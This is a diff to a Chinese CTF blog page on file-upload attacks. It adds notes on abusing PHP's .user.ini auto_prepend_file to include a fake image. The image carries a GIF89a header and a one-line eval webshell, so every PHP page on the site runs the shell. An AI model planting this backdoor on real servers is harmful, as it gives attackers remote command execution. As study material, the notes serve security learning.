@@ -22,15 +22,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="file_upload">
+  <meta name="description" content="file_upload.user.ini文件  只要是以fastcgi运行的php都可以用这个方法.user.ini文件作为php配置文件 可利用利用配置项构造后门 auto_append_file  指定一个文件，自动包含在要执行的文件后 auto_prepend_file  指定一个文件，自动包含在要执行的文件前  12345678910111213141516|-- .user.ini &#x2F;&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF文件上传">
 <meta property="og:url" content="http://example.com/2026/03/06/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Ducklinger">
-<meta property="og:description" content="file_upload">
+<meta property="og:description" content="file_upload.user.ini文件  只要是以fastcgi运行的php都可以用这个方法.user.ini文件作为php配置文件 可利用利用配置项构造后门 auto_append_file  指定一个文件，自动包含在要执行的文件后 auto_prepend_file  指定一个文件，自动包含在要执行的文件前  12345678910111213141516|-- .user.ini &#x2F;&#x2F;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-03-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-03-06T09:40:41.384Z">
+<meta property="article:modified_time" content="2026-03-08T02:11:52.703Z">
 <meta property="article:author" content="Ducklinger">
 <meta name="twitter:card" content="summary">
 
@@ -176,10 +176,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-03-06 00:00:00 / 修改时间：17:40:41" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
+              <time title="创建时间：2026-03-06 00:00:00" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-08 10:11:52" itemprop="dateModified" datetime="2026-03-08T10:11:52+08:00">2026-03-08</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -208,7 +214,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1>
+        <h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><pre><code>.user.ini文件
+</code></pre>
+<p>只要是以fastcgi运行的php都可以用这个方法<br><code>.user.ini</code>文件作为php配置文件 可利用利用配置项构造后门</p>
+<pre><code>auto_append_file  指定一个文件，自动包含在要执行的文件后
+auto_prepend_file  指定一个文件，自动包含在要执行的文件前
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|-- .user.ini //配置文件</span><br><span class="line">|-- shell.jpg //伪装成图片的后门</span><br><span class="line">|-- index.php //网站正常文件</span><br><span class="line"></span><br><span class="line">.user.ini内容：</span><br><span class="line">——————</span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">——————</span><br><span class="line"></span><br><span class="line">shell.jpg内容：</span><br><span class="line">——————</span><br><span class="line">GIF89a //图片头绕过检测</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt; //一句话木马</span><br><span class="line">——————</span><br><span class="line"></span><br><span class="line">即可在访问网站所有php文件时自动执行shell</span><br></pre></td></tr></table></figure>
+
+
     </div>
 
     
@@ -248,12 +262,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/03/06/CTF/GDK%E7%BC%96%E7%A0%81%E7%9A%84%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" rel="prev" title="CTFGDK编码注入">
-      <i class="fa fa-chevron-left"></i> CTFGDK编码注入
+    <a href="/2026/01/20/%E7%A2%8E%E8%AF%97/" rel="prev" title="零碎的诗句">
+      <i class="fa fa-chevron-left"></i> 零碎的诗句
     </a></div>
       <div class="post-nav-item">
-    <a href="/2026/03/06/CTF/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" rel="next" title="CTF数据库注入">
-      CTF数据库注入 <i class="fa fa-chevron-right"></i>
+    <a href="/2026/03/06/CTF/%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/" rel="next" title="CTF项目结构">
+      CTF项目结构 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
